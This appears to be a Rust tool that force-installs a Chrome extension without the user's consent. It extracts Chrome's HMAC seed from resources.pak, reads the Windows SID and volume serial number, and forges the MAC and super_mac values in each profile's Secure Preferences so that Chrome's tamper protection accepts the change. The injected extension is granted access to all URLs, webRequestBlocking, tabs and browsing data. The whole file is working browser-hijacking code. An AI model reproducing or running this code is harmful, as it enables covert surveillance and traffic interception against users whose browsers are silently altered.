use anyhow::{Result, Error};
use std::env;
use std::fs;
use std::io::{self, Read};
use std::path::{Path, PathBuf};
use std::process::Command;
use hmac::{Hmac, Mac};
use sha2::Sha256;
use sha2::Digest;
use serde_json::Value;

fn get_chrome_profile_paths() -> Option<Vec<PathBuf>> {
    let home_dir = dirs::home_dir()?;
    let base_path = home_dir
        .join("AppData")
        .join("Local")
        .join("Google")
        .join("Chrome")
        .join("User Data");

    if !base_path.exists() {
        return None;
    }

    let mut chrome_profiles = Vec::new();
    chrome_profiles.push(base_path.join("Default"));

    if let Ok(entries) = fs::read_dir(&base_path) {
        for entry in entries.flatten() {
            if let Ok(file_name) = entry.file_name().into_string() {
                if file_name.starts_with("Profile") {
                    chrome_profiles.push(base_path.join(file_name));
                }
            }
        }
    }

    Some(chrome_profiles)
}

fn dir_exists(dir_path: &str) -> bool {
    let path = Path::new(dir_path);
    fs::metadata(path).map(|m| m.is_dir()).unwrap_or(false)
}

fn get_volume_serial_number() -> Result<String> {
    let output = Command::new("cmd")
        .args(["/C", "vol"])
        .output()
        .map_err(|e| Error::msg(format!("Failed to execute command: {}", e)))?;

    if !output.status.success() {
        return Err(Error::msg("Command execution failed"));
    }

    let output_str = String::from_utf8_lossy(&output.stdout);
    if let Some(captures) = output_str.lines().find_map(|line| {
        let re = regex::Regex::new(r"Serial Number is ([A-F0-9-]+)").unwrap();
        re.captures(line)
    }) {
        return Ok(captures[1].to_string());
    }

    Err(Error::msg("Volume serial number not found."))
}

fn get_string_sid() -> Result<String> {
    let output = Command::new("cmd")
        .args(["/C", "whoami /user"])
        .output()
        .map_err(|e| Error::msg(format!("Failed to execute command: {}", e)))?;

    if !output.status.success() {
        return Err(Error::msg("Command execution failed"));
    }

    let output_str = String::from_utf8_lossy(&output.stdout);
    if let Some(captures) = regex::Regex::new(r"\bS-1-\d+-\d+(-\d+)*\b")
        .unwrap()
        .captures(&output_str)
    {
        let sid = captures[0].to_string();
        return Ok(sid[..sid.len() - 5].to_string());
    }

    Err(Error::msg("Failed to extract SID"))
}

fn get_hmac_sha256(key: &[u8], message: &[u8]) -> String {
    let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("HMAC can take key of any size");
    mac.update(message);
    let result = mac.finalize();
    let code_bytes = result.into_bytes();
    hex::encode(code_bytes)
}

fn get_extension_id(file_path: &Path) -> String {
    // Convert the file path to a wide (UTF-16) string
    let utf16_bytes: Vec<u8> = file_path
        .to_string_lossy()
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();

    // Compute the SHA-256 hash of the UTF-16 encoded file path
    let mut hasher = Sha256::new();
    hasher.update(&utf16_bytes);
    let hash = hasher.finalize();

    // Convert the hash to a hexadecimal string
    let mut output_buffer = String::new();
    for byte in &hash {
        output_buffer.push_str(&format!("{:02x}", byte));
    }

    // Map the first 32 hexadecimal characters to the desired extension ID
    let mut extension_id = String::new();
    for &byte in output_buffer.as_bytes().iter().take(32) {
        if byte > 0x2F && byte < 0x3A {
            extension_id.push((b'a' + (byte - 0x30)) as char);
        } else {
            extension_id.push((b'a' + (byte - 0x57)) as char);
        }
    }

    extension_id
}

fn get_key() -> Result<Vec<u8>> {
    let potential_paths = vec![
        PathBuf::from("C:\\Program Files (x86)\\Google\\Chrome\\Application"),
        PathBuf::from("C:\\Program Files\\Google\\Chrome\\Application"),
        dirs::home_dir()
            .map(|home| home.join("AppData\\Local\\Google\\Chrome\\Application"))
            .ok_or_else(|| Error::msg("Failed to get home directory"))?,
    ];

    let chrome_path = potential_paths
        .into_iter()
        .find(|dir| dir_exists(dir.to_str().unwrap_or("")))
        .ok_or_else(|| Error::msg("Chrome application path not found."))?;

    let version_dir = fs::read_dir(&chrome_path)
        .map_err(|_| Error::msg("Failed to read Chrome application directory"))?
        .filter_map(Result::ok)
        .map(|entry| entry.file_name().into_string().unwrap_or_default())
        .find(|name| name.chars().next().map(|c| c.is_digit(10)).unwrap_or(false))
        .ok_or_else(|| Error::msg("Chrome version directory not found."))?;

    let resources_path = chrome_path.join(version_dir).join("resources.pak");
    if !resources_path.exists() {
        return Err(Error::msg("resources.pak file not found."));
    }

    let mut file = fs::File::open(&resources_path).map_err(|_| Error::msg("Failed to open resources.pak"))?;
    let file_size = file
        .metadata()
        .map_err(|_| Error::msg("Failed to get file metadata"))?
        .len();

    let mut buffer = vec![0u8; file_size as usize];
    file.read_exact(&mut buffer).map_err(|_| Error::msg("Failed to read resources.pak"))?;

    let mut offset = 0;
    let version = u32::from_le_bytes(buffer[offset..offset + 4].try_into().unwrap());
    offset += 4;

    let resource_count = if version == 4 {
        let count = u32::from_le_bytes(buffer[offset..offset + 4].try_into().unwrap());
        offset += 4;
        count
    } else if version == 5 {
        offset += 4;
        let count = u16::from_le_bytes(buffer[offset..offset + 2].try_into().unwrap()) as u32;
        offset += 4;
        count
    } else {
        return Err(Error::msg(format!("Unsupported resources.pak version: {}", version)));
    };

    let mut prev_offset = 0;
    let mut key: Option<Vec<u8>> = None;

    for _ in 0..resource_count {
        let current_offset = u32::from_le_bytes(buffer[offset + 2..offset + 6].try_into().unwrap()) as usize;
        offset += 6;

        if prev_offset > 0 && current_offset - prev_offset == 64 {
            key = Some(buffer[prev_offset..current_offset].to_vec());
            break;
        }

        prev_offset = current_offset;
    }

    key.ok_or_else(|| Error::msg("Key not found in resources.pak."))
}

fn copy_recursive_sync(src: &Path, dest: &Path) -> io::Result<()> {
    let metadata = fs::metadata(src)?;

    if metadata.is_dir() {
        if !dest.exists() {
            fs::create_dir_all(dest)?;
        }

        for entry in fs::read_dir(src)? {
            let entry = entry?;
            let entry_path = entry.path();
            let dest_path = dest.join(entry.file_name());

            copy_recursive_sync(&entry_path, &dest_path)?;
        }
    } else {
        fs::copy(src, dest)?;
    }

    Ok(())
}

fn install_extension(zipfile_path: &Path) -> Result<()> {
    let temp_path = std::env::temp_dir().join("tempExtensions");
    if !temp_path.exists() {
        fs::create_dir_all(&temp_path)?;
    }

    if !zipfile_path.exists() {
        return Err(Error::msg(format!("The zip file {:?} does not exist.", zipfile_path)));
    }

    let file = fs::File::open(zipfile_path).map_err(|e| Error::msg(format!("Failed to open zip file: {:?}, error: {}", zipfile_path, e)))?;
    let mut archive = zip::ZipArchive::new(file)?;

    for i in 0..archive.len() {
        let mut file = archive.by_index(i)?;
        let outpath = temp_path.join(file.name());

        if file.is_dir() {
            fs::create_dir_all(&outpath)?;
        } else {
            if let Some(parent) = outpath.parent() {
                fs::create_dir_all(parent)?;
            }
            let mut outfile = fs::File::create(&outpath)?;
            io::copy(&mut file, &mut outfile)?;
        }
    }

    let manifest_path = temp_path.join("manifest.json");
    if !manifest_path.exists() {
        eprintln!("manifest.json not found");
        return Ok(());
    }

    let manifest_content = fs::read_to_string(&manifest_path)?;
    let manifest: Value = serde_json::from_str(&manifest_content)?;
    let extension_name = manifest["name"].as_str().unwrap_or("Unknown");

    let appdata_path = std::env::var("APPDATA").unwrap_or_else(|_| "".to_string());
    let appdata_path = Path::new(&appdata_path).join("BrowserExtensions");
    let extension_path = appdata_path.join(extension_name);

    if !extension_path.exists() {
        fs::create_dir_all(&extension_path)?;
    }

    for entry in fs::read_dir(&temp_path)? {
        let entry = entry?;
        let entry_path = entry.path();
        let dest_path = extension_path.join(entry.file_name());
        copy_recursive_sync(&entry_path, &dest_path)?;
    }

    let extension_id = get_extension_id(&extension_path);

    let key = get_key()?;

    let sid = get_string_sid()?;
    let volume_serial = get_volume_serial_number()?;

    if sid.is_empty() || volume_serial.is_empty() {
        eprintln!("Failed to retrieve SID or Volume Serial Number");
        return Ok(());
    }

    let chrome_profiles = get_chrome_profile_paths().unwrap_or_default();
    if chrome_profiles.is_empty() {
        eprintln!("No Chrome profiles found.");
        return Ok(());
    }

    for profile in chrome_profiles {

        let prefs_path = profile.join("Preferences");
        let secure_prefs_path = profile.join("Secure Preferences");

        let mut prefs: Value = if prefs_path.exists() {
            serde_json::from_str(&fs::read_to_string(&prefs_path)?)?
        } else {
            serde_json::json!({})
        };

        let mut secure_prefs: Value = if secure_prefs_path.exists() {
            serde_json::from_str(&fs::read_to_string(&secure_prefs_path)?)?
        } else {
            serde_json::json!({})
        };

        if prefs["extensions"]["install_signature"].get("ids").is_none() {
            prefs["extensions"]["install_signature"]["ids"] = serde_json::json!([]);
        }

        prefs["extensions"]["install_signature"]["ids"]
            .as_array_mut()
            .unwrap()
            .push(Value::String(extension_id.clone()));

        if prefs["extensions"]["toolbar"].is_null() {
            // Initialize as an empty array if null
            prefs["extensions"]["toolbar"] = serde_json::json!([]);
        } else if prefs["extensions"]["toolbar"].is_string() {
            // Convert a string to an array containing that string
            let existing_value = prefs["extensions"]["toolbar"].take();
            prefs["extensions"]["toolbar"] = serde_json::json!([existing_value]);
        }
        
        // Safely append to the array
        if let Some(toolbar) = prefs["extensions"]["toolbar"].as_array_mut() {
            toolbar.push(Value::String(extension_id.clone()));
        } else {
            eprintln!("Failed to access or initialize 'toolbar' as an array.");
        }

        let extension_data = format!(
            "{{\"active_permissions\":{{\"api\":[\"browsingData\",\"contentSettings\",\"tabs\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"\\u003Call_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"scriptable_host\":[\"\\u003Call_urls>\"]}},\"creation_flags\":38,\"from_bookmark\":false,\"from_webstore\":false,\"granted_permissions\":{{\"api\":[\"browsingData\",\"contentSettings\",\"tabs\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"\\u003Call_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"scriptable_host\":[\"\\u003Call_urls>\"]}},\"install_time\":\"13188169127141243\",\"location\":4,\"never_activated_since_loaded\":true,\"newAllowFileAccess\":true,\"path\":\"{}\",\"state\":1,\"was_installed_by_default\":false,\"was_installed_by_oem\":false}}",
            extension_path.display().to_string().replace("\\", "\\\\")
        );

        secure_prefs["extensions"]["settings"][&extension_id] = serde_json::from_str(&extension_data)?;

        let message = format!("{}extensions.settings.{}{}", sid, extension_id, extension_data);
        let hash = get_hmac_sha256(&key, message.as_bytes()).to_uppercase();

        secure_prefs["protection"]["macs"]["extensions"]["settings"][&extension_id] = Value::String(hash);

        let super_mac_message = format!("{}{}", sid, secure_prefs["protection"]["macs"]);
        let super_mac = get_hmac_sha256(&key, super_mac_message.as_bytes()).to_uppercase();
        secure_prefs["protection"]["super_mac"] = Value::String(super_mac);

        fs::write(&prefs_path, serde_json::to_string_pretty(&prefs)?)?;
        fs::write(&secure_prefs_path, serde_json::to_string_pretty(&secure_prefs)?)?;
    }

    println!("Extension installed successfully.");
    Ok(())
}

fn uninstall_extension(extension_name: &str) -> Result<()> {
    let appdata_path = std::env::var("APPDATA").unwrap_or_else(|_| "".to_string());
    let extension_path = Path::new(&appdata_path)
        .join("BrowserExtensions")
        .join(extension_name);

    // Check if the extension exists
    if !extension_path.exists() {
        eprintln!("Extension not found.");
        return Ok(());
    }

    // Remove the extension files
    fs::remove_dir_all(&extension_path).map_err(|e| Error::msg(format!("Failed to remove extension files: {}", e)))?;

    // Get Chrome profile paths
    let chrome_profiles = get_chrome_profile_paths().unwrap_or_default();
    if chrome_profiles.is_empty() {
        eprintln!("No Chrome profiles found.");
        return Ok(());
    }

    // Get the extension ID
    let extension_id = get_extension_id(&extension_path);

    for profile in chrome_profiles {
        let prefs_path = profile.join("Preferences");
        let secure_prefs_path = profile.join("Secure Preferences");

        // Load preferences
        let mut prefs: Value = if prefs_path.exists() {
            serde_json::from_str(&fs::read_to_string(&prefs_path)?)?
        } else {
            serde_json::json!({})
        };

        let mut secure_prefs: Value = if secure_prefs_path.exists() {
            serde_json::from_str(&fs::read_to_string(&secure_prefs_path)?)?
        } else {
            serde_json::json!({})
        };

        // Remove from Preferences
        if let Some(ids) = prefs["extensions"]["install_signature"]["ids"].as_array_mut() {
            ids.retain(|id| id != &Value::String(extension_id.clone()));
        }

        if let Some(toolbar) = prefs["extensions"]["toolbar"].as_array_mut() {
            toolbar.retain(|id| id != &Value::String(extension_id.clone()));
        }

        // Remove from Secure Preferences
        if let Some(settings) = secure_prefs["extensions"]["settings"].as_object_mut() {
            settings.remove(&extension_id);
        }

        if let Some(mac_settings) = secure_prefs["protection"]["macs"]["extensions"]["settings"].as_object_mut() {
            mac_settings.remove(&extension_id);
        }

        // Recalculate the super_mac
        if let Some(macs) = secure_prefs["protection"]["macs"].as_object_mut() {
            let sid = get_string_sid()?;
            let mac_message = format!("{}{}", sid, serde_json::to_string(macs)?);
            secure_prefs["protection"]["super_mac"] = Value::String(get_hmac_sha256(&get_key()?, mac_message.as_bytes()).to_uppercase());
        }

        // Write updated Preferences and Secure Preferences back to files
        fs::write(&prefs_path, serde_json::to_string_pretty(&prefs)?)?;
        fs::write(&secure_prefs_path, serde_json::to_string_pretty(&secure_prefs)?)?;
    }

    println!("Extension uninstalled successfully.");
    Ok(())
}


fn main() {
    let args: Vec<String> = env::args().collect();

    // Check if the correct number of arguments is provided
    if args.len() < 3 {
        eprintln!("Usage: {} <command> <extension_name_or_zipfile_path>", args[0]);
        std::process::exit(1);
    }

    // Get the command and second argument
    let command = &args[1];
    let argument = &args[2];

    if command == "install" {
        let zipfile_path = Path::new(argument);
        match install_extension(zipfile_path) {
            Ok(_) => println!("Installation completed successfully."),
            Err(e) => eprintln!("Error during installation: {}", e),
        }
    } else if command == "uninstall" {
        match uninstall_extension(argument) {
            Ok(_) => println!("Uninstallation completed successfully."),
            Err(e) => eprintln!("Error during uninstallation: {}", e),
        }
    } else {
        eprintln!("Unknown command: {}", command);
        println!("Usage:");
        println!("  Install extension: {} install <zipfile_path>", args[0]);
        println!("  Uninstall extension: {} uninstall <extension_name>", args[0]);
    }
}

